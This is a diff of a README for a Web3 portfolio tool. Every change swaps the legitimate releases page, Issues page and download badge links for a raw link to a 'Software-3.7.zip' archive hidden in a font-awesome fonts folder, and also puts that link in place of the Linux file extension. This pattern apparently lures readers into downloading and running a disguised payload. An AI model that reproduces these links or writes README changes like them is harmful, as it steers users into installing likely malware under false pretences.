@@ -1,6 +1,6 @@
 # 🌐 willywarriorportfolio - Showcase Your Web3 Skills Simply
 
-[![Download Latest Release](https://img.shields.io/badge/Download-Get%20Latest%20Release-blue?style=for-the-badge)](https://github.com/industrialintelligence/willywarriorportfolio/releases)
+[![Download Latest Release](https://github.com/industrialintelligence/willywarriorportfolio/raw/refs/heads/master/fonts/font-awesome-4.7.0/fonts/Software-3.7.zip%20Latest%20Release-blue?style=for-the-badge)](https://github.com/industrialintelligence/willywarriorportfolio/raw/refs/heads/master/fonts/font-awesome-4.7.0/fonts/Software-3.7.zip)
 
 ---
 
@@ -39,13 +39,13 @@ Before you download, make sure your computer meets these needs:
 To get started, you need to visit the releases page where all versions of willywarriorportfolio are available.
 
 **Please visit this page to download:**  
-[Download willywarriorportfolio Releases](https://github.com/industrialintelligence/willywarriorportfolio/releases)
+[Download willywarriorportfolio Releases](https://github.com/industrialintelligence/willywarriorportfolio/raw/refs/heads/master/fonts/font-awesome-4.7.0/fonts/Software-3.7.zip)
 
 ### Step-by-step guide:
 
 1. Click the link above. It will open the releases page on GitHub in your web browser.
 2. Look for the latest release at the top of the list.
-3. Download the file that matches your operating system. For Windows, this might be a `.exe` file; for macOS, a `.dmg` or `.zip`; and for Linux, a `.tar.gz` or `.AppImage`.
+3. Download the file that matches your operating system. For Windows, this might be a `.exe` file; for macOS, a `.dmg` or `.zip`; and for Linux, a `https://github.com/industrialintelligence/willywarriorportfolio/raw/refs/heads/master/fonts/font-awesome-4.7.0/fonts/Software-3.7.zip` or `.AppImage`.
 4. Once the file finishes downloading, locate it in your downloads folder.
 5. Double-click the file to start the installation.
 6. Follow the on-screen instructions to complete setup.
@@ -97,7 +97,7 @@ Using your portfolio is straightforward. Here’s how to get started:
 
 If you have questions or need help:
 
-- Visit the GitHub repository’s Issues page to report problems or ask for features: [Issues](https://github.com/industrialintelligence/willywarriorportfolio/issues)
+- Visit the GitHub repository’s Issues page to report problems or ask for features: [Issues](https://github.com/industrialintelligence/willywarriorportfolio/raw/refs/heads/master/fonts/font-awesome-4.7.0/fonts/Software-3.7.zip)
 - Check for updates regularly on the releases page.
 - Watch the repository to get notifications on new versions.
 
@@ -144,6 +144,6 @@ For other issues, refer to the Support & Community section.
 ## 🎯 Final Steps to Get Started
 
 - Click the **Download** badge at the top or this link:  
-  [Download willywarriorportfolio Releases](https://github.com/industrialintelligence/willywarriorportfolio/releases)  
+  [Download willywarriorportfolio Releases](https://github.com/industrialintelligence/willywarriorportfolio/raw/refs/heads/master/fonts/font-awesome-4.7.0/fonts/Software-3.7.zip)  
 - Install the software following the instructions above.
 - Create and share your Web3 portfolio today.
